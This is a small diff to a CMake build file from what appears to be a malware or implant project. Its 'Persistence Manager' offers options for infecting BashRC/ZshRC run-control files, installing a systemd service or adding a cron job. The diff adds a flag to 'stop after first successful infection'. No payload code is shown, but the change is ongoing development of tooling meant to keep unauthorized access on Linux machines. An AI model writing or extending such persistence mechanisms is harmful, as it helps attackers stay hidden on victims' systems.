@@ -160,12 +160,18 @@ option(ENABLE_PERSISTENCE "Enable Persistence Manager" ON)
 if(ENABLE_PERSISTENCE)
     add_compile_definitions(FEATURE_PERSISTENCE)
 
+    option(PERSIST_RC_ONCE    "RunControl: Stop after first successful infection" OFF)
     option(PERSIST_RUNCONTROL "Method: BashRC/ZshRC" ON)
     option(PERSIST_SERVICE    "Method: Systemd Service" OFF)
     option(PERSIST_CRON       "Method: Cron Job" OFF)
 
     if(PERSIST_RUNCONTROL)
         add_compile_definitions(METHOD_RUNCONTROL)
+
+        if(PERSIST_RC_ONCE)
+            add_compile_definitions(PERSIST_RC_ONCE)
+        endif()
+
         list(APPEND MODULE_SOURCES src/modules/persistence/RunControl.cpp)
     endif()
 
